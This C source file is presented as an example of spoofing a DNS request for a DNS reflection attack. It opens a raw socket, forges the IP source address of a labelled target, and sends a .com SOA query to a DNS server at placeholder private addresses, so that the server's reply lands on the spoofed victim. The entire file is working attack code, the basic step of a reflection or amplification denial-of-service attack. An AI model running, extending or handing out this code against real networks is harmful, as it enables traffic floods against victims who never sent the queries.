/*
	Example on how to spoof a DNS request (As used in DNS reflection attack)
	by Kim Nielsen 

	Thanks to Ivan for helping out :)
*/

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#define __FAVOR_BSD
#include <netinet/udp.h>

/* .com SOA (21 bytes) */
const char dns_query[] = "\x47\x6e\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x63\x6f\x6d\x00\x00\x06\x00\x01";

struct ipv4 {
    struct ip       ip;
    struct udphdr   udp;
    char            payload[21];
} packed;

int main(int argc, char **argv) {
	size_t packetsize, headersize, extraipheadersize;
	struct ipv4 packet;
	ssize_t num;
	struct sockaddr_in remote_addr;
	int on = 1;
	int sd;

	sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
	if (sd < 0) {
		fprintf(stderr, "Cannot create raw socket: %s\n", strerror(errno));
		abort();
	}

	if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, (char *) &on, sizeof(on)) < 0) {
		fprintf(stderr, "Cannot set IP_HDRINCL: %s\n", strerror(errno));
		abort();
        }

	/* IP */
        memset(&packet.ip, '\0', sizeof(packet.ip));
        packet.ip.ip_v = 4;
        packet.ip.ip_hl = sizeof(packet.ip) >> 2;

	/* DNS */
        packet.ip.ip_dst.s_addr = inet_addr("192.168.1.1");

	/* Target */
        packet.ip.ip_src.s_addr = inet_addr("192.168.1.7");

        packet.ip.ip_p = IPPROTO_UDP;
        packet.ip.ip_ttl = 250;
        headersize = sizeof(packet.ip) + sizeof(packet.udp);
        packetsize = headersize + 21;
        packet.ip.ip_len = htons(packetsize);

	/* UDP */
        packet.udp.uh_dport = htons(53);
        packet.udp.uh_sport = htons(random() % 30000);
        packet.udp.uh_ulen = htons(21 + sizeof(packet.udp));
	/* On Linux its ok to set checksum to 0 but it does not work on BSD */
        packet.udp.uh_sum = 0;

	remote_addr.sin_addr.s_addr = packet.ip.ip_dst.s_addr;
	remote_addr.sin_port = packet.udp.uh_dport;
	remote_addr.sin_family = AF_INET;

	memcpy(packet.payload, dns_query, 21);
	packet.payload[0] = random() % 255;
	packet.payload[1] = random() % 255;
        extraipheadersize = 0;

	fprintf(stdout, "Sending %i bytes (%i for the headers)...\n", (int) packetsize, (int) headersize);

	num = sendto(sd, &packet, packetsize + extraipheadersize, 0, (struct sockaddr*)&remote_addr, sizeof(remote_addr));
	if (num < 0) {
        	fprintf(stderr, "Cannot send message:  %s\n", strerror(errno));
        	abort();
    	}
    	return (0);
}
